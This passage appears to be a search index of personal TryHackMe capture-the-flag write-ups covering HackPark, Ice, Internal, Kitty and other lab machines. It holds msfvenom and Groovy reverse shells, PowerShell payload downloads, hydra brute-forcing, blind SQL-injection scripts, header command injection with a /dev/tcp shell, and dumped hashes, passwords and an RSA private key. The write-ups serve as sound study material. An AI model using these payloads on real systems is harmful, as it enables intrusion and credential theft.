\"/Account/login.aspx:__VIEWSTATE=1jT%2FeKIquWyJY0kSi8eRWohPxvCGdIIZV74C%2BT%2FZf%2Fb94iWqLDuDKsAtaU2zqX2ysa3nlvkLNu5CyGGAPm2PrKhw8v5yl2lA341dkBu6H71fKkVzJ8%2FF%2Fyd4yBPApWjOgRWMPCdeFcpAgpSKjjJ%2BEIVAL%2BMA%2Bd7gLa5hAI2iI1YpPSmwsjbk9LKSdnHMNek1VcNk4%2B2vuhswUwqhJGDcpg657X27UE0QPvhqFh7fjdmblWSCjMQWlCc0Hr7ijgm7UaflAa4Z91EiFcr%2B6ZdXfOQLMsUqjXihripRyLnT6TANeBnInJOGL%2BGffW6cydxDv76xll19RWNGx9qLY%2FPCUZZGTwr1rdBjAtHY5QSRy%2BVeL5hy&amp;__EVENTVALIDATION=pWIL9Mp6tOVGVfPCpIjlfvYXtZFShT9iBDKzsaWtjZY9tSRTTIiphJpDTaqXM5Fak4fRWpsH9qIjGI4hrr42hGkPMJ%2BDK%2BUprfMQc6byfqWjLH428ei9KNuD%2FoxibJwoLskM4RdCwU96Mka6jG7rTUBiwpTHXVOxeMgH5a7dgek%2FjIGM&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed\"\n</code></pre> <pre><code>[STATUS] 736.00 tries/min, 736 tries in 00:01h, 14343662 to do in 324:49h, 16 active\n[80][http-post-form] host: 10.10.201.122   login: admin   password: 1qaz2wsx\n</code></pre> <p></p> <p>BlogEngine.NET</p> <p>Version: 3.3.6.0 </p>"},{"location":"HackPark/03-exploit/","title":"03 exploit","text":"<p>BlogEngine.NET</p> <p>Version: 3.3.6.0 </p> <p>https://www.exploit-db.com/exploits/46353</p> <p>change the exploit and rename to PostView.ascx</p> <p></p> <p> and publish</p> <p>go to  http://10.10.201.122/?theme=../../App_Data/files</p> <p>and we got the shell </p> <p></p> <p></p>"},{"location":"HackPark/03-exploit/#shell-upgrademeterpreter","title":"shell upgrade(meterpreter)","text":"<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.17.4.208 LPORT=9001 -f exe -o exploit.exe</code></p> <p>transfer and run</p> <p><code>cd C:\\Windows\\Temp</code></p> <p><code>powershell -c wget \"http://10.17.4.208/exploit.exe\" -outfile exploit.exe</code></p> <p></p>"},{"location":"HackPark/03-exploit/#shell-upgradewithout-meterpreter","title":"shell upgrade(without meterpreter)","text":"<p><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 -f exe -o exploit1.exe</code></p> <p><code>powershell -c wget \"http://10.17.4.208/exploit1.exe\" -outfile exploit1.exe</code></p> <p></p> <p>powershell -c wget \"http://10.17.4.208/winpeas.bat\" -outfile winpeas.bat</p> <p>and running it does not show the sysinfo</p> <p></p> <p>also transferring the winpeasx64 was taking ages..</p> <p>so run <code>systeminfo | findstr /i date</code></p> <p></p>"},{"location":"HackPark/04-Root/","title":"04 Root","text":"<p>from the services running (ps) we see that there is a WScheduler.exe service running.  And from the program files its SystemScheduler</p> <p></p> <p>and then from the logs its due to Message.exe</p> <p></p> <p>and its in the <code>C:\\program files (x86)\\SystemScheduler</code> </p> <p>so we will override it </p> <p>generate the payload and listen and after few seconds we got the shell</p> <p><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 -f exe -o message.exe</code></p> <p></p>"},{"location":"Ice/01-nmap/","title":"01 nmap","text":"<pre><code>\u2514\u2500$ nmap -sC -sV -oN nmap 10.10.204.125                                                                        130 \u2a2f\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-06-25 12:39 IST\nNmap scan report for 10.10.204.125\nHost is up (0.14s latency).\nNot shown: 989 closed ports\nPORT      STATE SERVICE            VERSION\n135/tcp   open  msrpc              Microsoft Windows RPC\n139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)\n3389/tcp  open  ssl/ms-wbt-server?\n| ssl-cert: Subject: commonName=Dark-PC\n| Not valid before: 2021-06-24T06:53:03\n|_Not valid after:  2021-12-24T06:53:03\n|_ssl-date: 2021-06-25T07:11:01+00:00; -1s from scanner time.\n5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Service Unavailable\n8000/tcp  open  http               Icecast streaming media server\n|_http-title: Site doesn't have a title (text/html).\n49152/tcp open  msrpc              Microsoft Windows RPC\n49153/tcp open  msrpc              Microsoft Windows RPC\n49154/tcp open  msrpc              Microsoft Windows RPC\n49157/tcp open  msrpc              Microsoft Windows RPC\n49163/tcp open  msrpc              Microsoft Windows RPC\nService Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 1h14m59s, deviation: 2h30m00s, median: 0s\n|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:53:11:61:c8:b7 (unknown)\n| smb-os-discovery: \n|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)\n|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional\n|   Computer name: Dark-PC\n|   NetBIOS computer name: DARK-PC\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2021-06-25T02:10:55-05:00\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2021-06-25T07:10:55\n|_  start_date: 2021-06-25T06:53:01\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 101.02 seconds\n</code></pre>"},{"location":"Ice/02-web/","title":"02 web","text":""},{"location":"Ice/03-exploit/","title":"03 exploit","text":"<p>CVE-2004-1561</p> <p><code>windows/http/icecast_header</code></p> <p></p>"},{"location":"Ice/04-root/","title":"04 root","text":"<p>exploit/windows/local/bypassuac_eventvwr</p> <p></p> <p>SeTakeOwnershipPrivilege  </p> <p>migrating to NT-AUTHORITY  </p> <p>got root  </p>"},{"location":"Ice/05-loot/","title":"05 loot","text":"<p>load Mimikatz and get the creds</p> <p></p> <p>hash dump </p> <pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDark:1000:aad3b435b51404eeaad3b435b51404ee:7c4fe5eada682714a036e39378362bab:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n</code></pre>"},{"location":"Internal/00-creds/","title":"00 creds","text":"<pre><code>bruteforcing: admin:my2boys\n\nfrom private post: william:arnold147\n\ndb pass: wordpress:wordpress123\n\n/opt/wp-save.txt:  aubreanna:bubb13guM!@#123\n\njenkins bruteforce:  admin:spongebob\n\njenkins docker root:tr0ub13guM!@#123\n\n</code></pre>"},{"location":"Internal/01-nmap/","title":"01 nmap","text":"<pre><code>\u2514\u2500$ nmap -sC -sV -p- -oN nmap 10.10.57.200              \nStarting Nmap 7.91 ( https://nmap.org ) at 2021-05-29 15:55 IST\nNmap scan report for 10.10.57.200\nHost is up (0.13s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)\n|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)\n|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 619.25 seconds\n</code></pre>"},{"location":"Internal/02-web/","title":"02 web","text":""},{"location":"Internal/02-web/#port-80","title":"port 80","text":""},{"location":"Internal/02-web/#fuzzing","title":"fuzzing","text":"<p>on requesting the page http://10.10.57.200/blog/ it looks for a v-host <code>internal.thm</code></p> <p></p> <p>and http://internal.thm/blog/ opes just so fine</p> <p></p>"},{"location":"Internal/03-foothold/","title":"03 foothold","text":"<p>scanning it via wpscan</p> <p>wordpress 5.4.2</p> <p></p> <p>and we can bruteforce the creds and admin is a username </p> <p></p> <p><code>wpscan --url http://internal.thm/wordpress/  -U admin -P /usr/share/wordlists/rockyou.txt -t 50</code></p> <p></p> <p><code>admin:my2boys</code></p> <p></p> <p>and in the posts section there is a private post </p> <p></p> <p>and another creds</p> <p></p> <p><code>william:arnold147</code></p>"},{"location":"Internal/03-foothold/#rev-shell","title":"rev shell","text":"<p>edit the 404 page</p> <p>http://internal.thm/blog/wp-admin/theme-editor.php?file=404.php&amp;theme=twentyseventeen</p> <p>listen on port </p> <p><code>curl http://internal.thm/wordpress/</code> </p> <p></p>"},{"location":"Internal/04-user/","title":"04 user","text":"<p>wp-config</p> <p></p> <p>http://internal.thm/phpmyadmin/</p> <p><code>wordpress:wordpress123</code> </p> <p>nothing interesting in the database so back to box and in the /opt there is the password(wp-save.txt)</p> <p></p> <p><code>aubreanna:bubb13guM!@#123</code></p> <p></p> <p>user === THM{int3rna1_fl4g_1}</p>"},{"location":"Internal/05-root/","title":"05 root","text":"<p>in the home folder it says there is a jenkins service running on port 8080 </p> <p></p> <p>port forwarding via ssh  </p> <p>jenkins website  </p> <p>and not a single cred works</p> <p>bruteforcing with admin</p> <p>(change the port from 8080 for burpsuite to work <code>ssh -L 80:127.0.0.1:8080 aubreanna@internal.thm</code>)</p> <p></p> <p><code>j_username=admin&amp;j_password=admin&amp;from=%2F&amp;Submit=Sign+in</code></p> <p><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form \"/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in:Invalid username or password\"</code></p> <p></p> <p>and we got a hit</p> <p><code>admin:spongebob</code></p> <p>and we are in   </p> <p>and from manage http://127.0.0.1/manage we can exectute a groovy script and get shell </p> <p></p> <p>from here we get the script  https://github.com/gquere/pwn_jenkins</p> <pre><code>String host=\"10.17.4.208\";\nint port=9001;\nString cmd=\"/bin/bash\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n</code></pre> <p>listen and run  </p> <p>and we got shell as jenkins</p> <p></p> <p>and then enumrating the docker container we got the creds from the /opt/note.txt</p> <p></p> <p><code>root:tr0ub13guM!@#123</code></p> <p>ssh</p> <p></p> <p>root == THM{d0ck3r_d3str0y3r}</p>"},{"location":"Investigating%20Windows/Investigating%20Windows/","title":"Investigating Windows","text":"<p>Getting system information <code>systeminfo</code></p> <p></p> <p>Get details about a user <code>net user username</code></p> <p></p> <p>Details for all the process that are executed when a system starts are can be found in one of the Registry Entries i.e. <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code></p> <p>And get details for those processes </p> <p><code>Get-Item \"Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"</code></p> <p></p> <p>Get details who have admin privilages <code>net localgroup administrators</code></p> <p></p> <p>List of all the scheduled tasks can be found using the command: <code>Get-ScheduledTask</code></p> <p></p> <ul> <li> <p>So, we can get details of the process using the command: <code>Get-ScheduledTaskInfo -TaskName \"&lt;scheduled_task_name&gt;\"</code></p> </li> <li> <p>But this does not provide us with the actions that are being performed by the scheduled task. To get that information, we can use the command: <code>Get-ScheduledTask -TaskName \"&lt;scheduled_task_name&gt;\" | Select *</code>     This query provides all the details of the scheduled task but again not the exact thing that is the command being executed by the task.</p> </li> <li> <p>To get the details of the action that are being performed by the scheduled task, the command that can be used is: <code>(Get-ScheduledTask -TaskName \"&lt;scheduled_task_name&gt;\").Actions</code></p> </li> </ul> <p></p> <p>To get the date of compromise we first see when the files were created in the TMP folder</p> <p></p> <p>Here, it can be seen the date when the files were written but to be sure about the creation time of file, we can use the command: <code>(Get-ChildItem &lt;suspicious_task_file&gt;).CreationTime</code></p> <p></p> <p>The event ID generated when special privileges are assigned to a new logon is 4672. So, we can look for events associated with this event ID around the time when the system got compromised.</p> <p>Again, there are going to be a lot many entries for the username \u201cSYSTEM\u201d in the output so we can filter them out</p> <p>`Get-EventLog -LogName Security -After 3/2/2019 -InstanceId 4672 | where {$_.Message -notmatch \"SYSTEM\"} | select *``</p> <p>This generates a lot many entries but we need to find the specific one when required for answering this question.</p> <p>But even after trying a lot, I was not able to find the exact event. So, looked up in the hint and found an entry with similar entry in the output and that worked as the answer to the question as well.  <code>Get-EventLog -LogName Security -Index 151109 -InstanceId 4672 | select *</code></p> <p></p> <p>Reading the min-out.file we get to know that Mimikatz was used to get passwords from the machine</p> <p></p> <p>Control and Command(CnC/C2) server. In general, when an attacker hacks a machine that is connected to a network, they will set up a server between them and the target machine: the attacker will send the commands to the C2 server, which will then feed it to the target machine. The C2 server as well serves as a quick repository for any data exfiltrated from the target machine, though the attacker will generally remove the data from the C2 server and place it somewhere more secure.</p> <p>In general, an attacker will oftentimes add the C2 server IP address to the hosts file: if you catch the attacker before they are finished and covered their tracks, you may be able to see it there.  <code>Get-ChildItem -Path C:\\ -Include hosts -Recurse</code></p> <p></p> <p>from here we get to know the path and then simply read the hosts file</p> <p></p> <p>Here there is an extra entry of google with external ip, rest are all redirected to localhost. So the ip of the c2 server is 76.32.97.132</p> <p>All the files associated with a Web Server on a Windows server machine are stored at <code>C:\\inetpub\\wwwroot</code></p> <p></p> <p>Details for the ports that are open or close can be found in the firewall rules. So, we can try to dump the contents of the inbound and outbound firewall rules to look for any odd port for which a rule has been specifically created.</p> <p><code>Get-NetFirewallRule -Direction Inbound | select DisplayName, DisplayGroup, @{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}</code></p> <p> Here its the last port opened by the attacker</p> <p>Check for DNS poisoning, what site was targeted? In this we get google.com was targeted, as seen in the hosts file.</p>"},{"location":"Kitty/00-creds/","title":"00 creds","text":"<p>user creds <code>kitty</code>:<code>L0ng_Liv3_KittY</code></p> <p>db creds /var/www/html/config.php:define('DB_PASSWORD', 'Sup3rAwesOm3Cat!'); /var/www/html/config.php:define('DB_USERNAME', 'kitty');</p>"},{"location":"Kitty/01-nmap/","title":"01 nmap","text":"<pre><code>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-12 00:07 IST\nNmap scan report for 10.10.19.115\nHost is up (0.16s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 b0:c5:69:e6:dd:6b:81:0c:da:32:be:41:e3:5b:97:87 (RSA)\n|   256 6c:65:ad:87:08:7a:3e:4c:7d:ea:3a:30:76:4d:04:16 (ECDSA)\n|_  256 2d:57:1d:56:f6:56:52:29:ea:aa:da:33:b2:77:2c:9c (ED25519)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Login\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 20.86 seconds\n\n</code></pre>"},{"location":"Kitty/02-web/","title":"02 web","text":"<p>post sign up  </p>"},{"location":"Kitty/03-foothold/","title":"03 foothold","text":"<p>On trying the sql injection query from  https://github.com/payloadbox/sql-injection-payload-list</p> <pre><code>' OR 1 -- -\n</code></pre> <p></p> <p>On fuzzing the payload works with, </p> <pre><code>admin'  AND 1=1-- \n</code></pre> <p>we have the extra space... .</p> <p>when requested from repeater, we are getting 302 for the same payload </p> <p>When trying with the other username we are getting 200 which actually dosnt lead to any where.</p> <p></p> <p>So we can conclude that 302 is a positive resp but 200 is not. </p> <p>In burp we need to change the cookie value for the different req, which gives a prev sec we know the admin creds with the cookie reuse possibility. </p> <p>Using curl for the recursive req</p> <p>Original taken from Burp curl -i -s -k -X $'POST' \\     -H $'Host: 10.10.19.115' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 40' -H $'Origin: http://10.10.19.115' -H $'Connection: close' -H $'Referer: http://10.10.19.115/index.php' -H $'Upgrade-Insecure-Requests: 1' \\     -b $'PHPSESSID=2c53oqrpln03phqr0teenbvjmBV' \\     --data-binary $'username=test1%27+AND+1%3D1--+&amp;password=' \\     $'http://10.10.19.115/index.php'</p> <p>updated curl req</p> <p><code>curl 'http://10.10.19.115/index.php/' -X POST -d \"username=test1%27+AND+1%3D1--+&amp;password=\" -s -w \"%{http_code}\" -o /dev/null</code></p> <p></p> <p>And the query works is, mind the white space <code>admin' ORDER BY 1 --</code></p> <p>On manually brute forcing, we get there are 5 columns,</p> <pre><code>curl 'http://10.10.19.115/index.php/' -X POST -d \"username=admin%27+ORDER+BY+4--+&amp;password=\" -s -w \"%{http_code}\" -o /dev/null\n</code></pre> <p></p> <p>After multiple attempts to find the db name using the like and union query formats, we landed up with,</p> <pre><code>curl 'http://10.10.19.115/index.php/' -X POST -d \"username=%27+UNION+SELECT+1,2,3,4+WHERE+database()+LIKE+'m%'--+&amp;password=\" -s -w \"%{http_code}\" -o /dev/null\n\n</code></pre> <p></p> <p>Now we can seemingly write a script for this to automate?</p> <pre><code>import requests\n\nres = \"\"\n\nchars_list = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-/:~$^ \"\n\nip = \"10.10.19.115\"\n\nwhile True:\n    for i in chars_list:\n        body= {\"username\":f\"' UNION SELECT 1,2,3,4 WHERE database() LIKE '{res+i}%'-- \",\"password\":\"\"}\n        response = requests.post(f\"http://{ip}/index.php\", data=body,allow_redirects=False)\n        status_code=response.status_code\n        if status_code == 302:\n            res = res+i\n            print(f\"in progress ==&gt; {res}\")\n            break\n        elif i == \" \" :\n            print(f\" final ==&gt; {res}\")\n            exit()\n</code></pre> <p></p> <p>updating the payload query to get the users... </p> <pre><code>' UNION SELECT 1,2,3,4 WHERE database() LIKE '{res+i}%'--\n</code></pre> <pre><code>import requests\n\nres = \"\"\n\nchars_list = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-/:~$^ \"\n\nip = \"10.10.19.115\"\n\nwhile True:\n\n    for i in chars_list:\n\n        body= {\"username\":f\"' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema = database() AND table_name LIKE '{res+i}%' -- \",\"password\":\"\"}\n\n        response = requests.post(f\"http://{ip}/index.php\", data=body,allow_redirects=False)\n\n        status_code=response.status_code\n\n        if status_code == 302:\n\n            res = res+i\n\n            print(f\"in progress ==&gt; {res}\")\n\n            break\n\n        elif i == \" \" :\n\n            print(f\" final ==&gt; {res}\")\n\n            exit()\n    ```\n![Pasted image 20240212013401.png](&lt;../etc/Pasted image 20240212013401.png&gt;)\n\nupdated query to find the usernames, \n</code></pre> <p>' UNION SELECT 1,2,3,4 FROM siteusers WHERE username LIKE '{res+i}%' --</p> <pre><code>\n```python\nimport requests\n\nres = \"\"\n\nchars_list = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-/:~$^ \"\n\nip = \"10.10.19.115\"\n\nusers = set()\n\nwhile True:\n\n    for idx, i in enumerate(chars_list):\n\n        if \"admin\" in users and idx == 0 and i == \"a\":\n\n        continue\n\n        body= {\"username\":f\"' UNION SELECT 1,2,3,4 FROM siteusers WHERE username LIKE '{res+i}%' -- \",\"password\":\"\"}\n\n        response = requests.post(f\"http://{ip}/index.php\", data=body,allow_redirects=False)\n\n        status_code=response.status_code\n\n        if status_code == 302:\n\n            res = res+i\n\n            print(f\"in progress ==&gt; {res}\")\n\n            break\n\n        elif i == \" \":\n\n            print(f\" final ==&gt; {res}\")\n\n            if res == \"admin\":\n\n            users.add(res)\n\n\n\n            # exit()\n\n            res = \"\"\n</code></pre> <p></p> <p>so after a non-optimal user bruteforcing we got the user name kitty</p> <p>now brute forcing for password. </p> <pre><code>' UNION SELECT 1,2,3,4 FROM siteusers WHERE username='kitty' AND password LIKE '{res+i}%' -- \n</code></pre> <pre><code>import requests\n\nres = \"\"\n\nchars_list = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-/:~$^ \"\n\nip = \"10.10.19.115\"\n\nwhile True:\n\n    for i in chars_list:\n\n        body= {\"username\":f\"' UNION SELECT 1,2,3,4 FROM siteusers WHERE username='kitty' AND password LIKE '{res+i}%' -- \",\"password\":\"\"}\n\n        response = requests.post(f\"http://{ip}/index.php\", data=body,allow_redirects=False)\n\n        status_code=response.status_code\n\n        if status_code == 302:\n\n            res = res+i\n\n            print(f\"in progress ==&gt; {res}\")\n\n            break\n\n        elif i == \" \" :\n\n            print(f\" final ==&gt; {res}\")\n\n            exit()\n</code></pre> <p></p> <p>But on trying to ssh, it fails.  </p> <p>It could be due to the case insensitive of sql db.  Lets use binary in the qeury to return us case sensitive results.</p> <pre><code>' UNION SELECT 1,2,3,4 FROM siteusers WHERE username='kitty' AND password LIKE BINARY '{res+i}%' -- \n</code></pre> <p></p>"},{"location":"Kitty/04-user/","title":"04 user","text":"<p>with the script we got the password and we are in </p> <p></p> <p>user flag: THM{31e606998972c3c6baae67bab463b16a}</p>"},{"location":"Kitty/05-root/","title":"05 root","text":"<p>On running linpeas we found. </p> <pre><code>/var/www/development/config.php:define('DB_PASSWORD', 'Sup3rAwesOm3Cat!');                                    \n/var/www/development/config.php:define('DB_USERNAME', 'kitty');\n/var/www/html/config.php:define('DB_PASSWORD', 'Sup3rAwesOm3Cat!');\n/var/www/html/config.php:define('DB_USERNAME', 'kitty');\n\n</code></pre> <p>Running pspy64 on the box</p> <p></p> <p></p> <p>There seems to be another sever running at the box</p> <p>checking on the db </p> <p></p> <p>and we have another service on port 8080 as we dont have any other user data other then kitty </p> <p>forwarding the port to local </p> <p></p> <p>And there is the usual same old webpage.</p> <p>Focusing back on the script in /opt/  it so seems that its logging the data to the root folder, we can somehow overwrite the data and try to get the root access</p> <p>On checking the code base, we see that we are logging the ip for the bad user activity where sql injection is detected, but on trying an empty string is being populated..</p> <p></p> <p>On checking the request, we dont have the desired parameter itself... </p> <p>After working on payload and adding the headers, we finally got the desired output in the logged file, but its being overwritten by the cron</p> <p></p> <p></p> <p>We can escape the echo by passing  \";\" and then the own command</p> <p><code>X-Forwarded-For:; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHRj4MK91KXpCZgtSZqy1RAOjWWVyW/GVdjFCjH/4msx\"&gt; /root/.ssh/authorized_keys</code> </p> <pre><code>X-Forwarded-For:; /bin/bash -c '/bin/bash -i &gt;&amp; /dev/tcp/10.17.55.107/9001 0&gt;&amp;1'\n</code></pre> <p>Okay so with the above header being passed with the port opened to listen, we finally got the reverse shell.</p> <p></p> <p></p> <p>Root flag: THM{581bfc26b53f2e167a05613eecf039bb}</p>"},{"location":"LFI/lfi/","title":"Lfi","text":""},{"location":"LFI/lfi/#nmap","title":"nmap","text":""},{"location":"LFI/lfi/#web","title":"web","text":""},{"location":"LFI/lfi/#lif","title":"lif","text":"<p>private id_rsa </p> <pre><code>-----BEGIN RSA PRIVATE KEY----- \nMIIEpAIBAAKCAQEAy5ab5+v0aBYFL7dN4O69CqvZdjpSk4/BFMOEndp71fy4qlBi ewnTYIyKS1DjNhLdbLJZV/8oKOIx/BVSxrw3hnjL/b5d3jUpX1edcX8hjTt10LCT ubgjWekIpspImHtp/vf9n0IlL1GIWLsxKZXEqyoSvvG4LU6ajrMyHM9jyZ7yMAsS lHtfNzX22taxJliHF3SFDjf6Z0otY98T273qy6uTchBDEIZx7uJGQF4h9bvSq+22 e7QFY/h/cLrVUPGcRgv2VH4958A5n+BA48ioVyjGRcJlPsa8fNuFkgA8VlJqx/zD Erf3G97zCY5iZSSm6g+9aUBAoqJqQqnZ1JY/jQIDAQABAoIBAQCjN3qEY7GM5OKB j6Z7B0s9S+rKkxVywdQczmb6mpefRb3SpSFe3NC+3c1ddlrCFju4kf94wdIzfKxw GbREKc8mGqAILN9abypdCoPp4u9GJ/5bMcUtJogI4/+QoCm1PXQL+ks1q7TeC7KQ 2HogibajNtbSiD2M7TCR6O3rFQU+NKW3P8R5rTJBFxSqXcoL0aZoOdIISuGo4e2D w5p8eLHiYmKmQ3KYW58fau1Qnr8t0YoHDlG2wezNBQSckt5xxjY4XWlfcMPAQIP9 VWxv77zIqfLFYj6oH0opPHX7SbdpFVj00h7Ee2C0QR7CKj4lxmE2Dn97LEXksfWM PqmJwiRBAoGBAPRGPZtAT7TfTac7lXbOYNj/5HuK1Pc7+GtsT8V3AJwbhkeZG/B+ ERee3gKlXhglEup0duxBwy5zTy6vsegMo7sk2ii/GlboR44Yy7OYbjrmIw7JRx6i IIjN6YeKM+dwLGL7+xG2EavrRBJbuYfp1R139gK5CWd6Yu6xdwtCPS8xAoGBANVc ZhSQOWzkN0Yq4CsAnKrrtIeynX7wTppy2F3N8/CQHQIYjFx0SZxs/1MlTXEpFdC+ VHhQ+Cy5O+hndqXiG5sty9wC67lZNaxuBkMoxKgX42JAgxxE41lUadAdRHJ4cq7A 1DiJ1xq3XwP1ZaUEVE/Y3EusMhtr/A6z1dGJcpcdAoGAdb6d14XqZb71iVS5OOlF 2ZOPKNXEzd+EYRN2aDJygszprv1ocEX0KzSSwye+8Vh9g7Hb2Qnh8TP3yQM7eCUP jxe2aMmlAps4UpA1MD6bc5yW7Xur4mI32HmYxZKibj6txpC7dtASOJJQ36CDD7Zw 2aGHXcyfcdeWdIPqY+zr3SECgYEAoi4SCh93ByaSPWvp6cYVUHbKSzuiLBNOLGiP vv4GJx3kbutqBfz+10Ci8/iu3Q11365NVwd1HcnPl+DNd1pf0Z0GEL7Hn6QIAIHB kNs0YPGHje+ruZlDl2tq4x7cIIcd5Wf96Nwd/djVCJVIJh8cV3VoPr0teVqjxik8 poHr8KECgYBGJ/FLmaloEl00YECXAy2uMlvGyaAr2tsq28JF3LvZOXNIhB71+11V E/gv9PP0ruJJRBv5r2DjAcsWA+sIBf5O8+z5dTeuto5v+WTrpOy8i3FLEWl3hqRH ANCTI4EhCynYtF8zi8so5zeomlncFZg7JD/dL0gHXu4FImx5sUO9gg== \n-----END RSA PRIVATE KEY----- \n</code></pre>"},{"location":"LFI/lfi/#user","title":"user","text":"<p><code>ssh -i id_rsa_falcon falcon@10.10.8.221</code></p> <p></p> <p></p>"},{"location":"LFI/lfi/#root","title":"root","text":"<p>https://gtfobins.github.io/gtfobins/journalctl/#sudo</p> <p></p>"},{"location":"MAL%20Malware%20Introductory/MAL%20Malware%20Introductory/","title":"MAL Malware Introductory","text":"<pre><code>C:\\Users\\Analysis\\Desktop\\**Tools\\Static\\PE Tools\n\n-   Dependency Walker (depends)\n-   PeID\n-   PE Explorer\n-   PEview\n-   ResourceHacker\n\nC:\\Users\\Analysis\\Desktop\\**Tools\\Static\\Disassembly\n\n-   IDA Freeware\n-   WinDbg\n\nC:\\Users\\Analysis\\Desktop\\Tools\\Sysinternalsuite\n\n-   ResourceHacker\n\nC:\\Users\\Analysis\\Desktop\\Tools\\Dynamic\n</code></pre>"},{"location":"MrRobot/mrrobot/","title":"Mr Robot CTF","text":""},{"location":"MrRobot/mrrobot/#nmap","title":"nmap","text":"<pre><code>\u2514\u2500$ nmap -sC -sV -oN nmap 10.10.187.41                                                                        130 \u2a2f\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-05-19 11:04 IST\nNmap scan report for 10.10.187.41\nHost is up (0.13s latency).\nNot shown: 997 filtered ports\nPORT    STATE  SERVICE  VERSION\n22/tcp  closed ssh\n80/tcp  open   http     Apache httpd\n|_http-server-header: Apache\n|_http-title: Site doesn't have a title (text/html).\n443/tcp open   ssl/http Apache httpd\n|_http-server-header: Apache\n|_http-title: Site doesn't have a title (text/html).\n| ssl-cert: Subject: commonName=www.example.com\n| Not valid before: 2015-09-16T10:45:03\n|_Not valid after:  2025-09-13T10:45:03\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 43.65 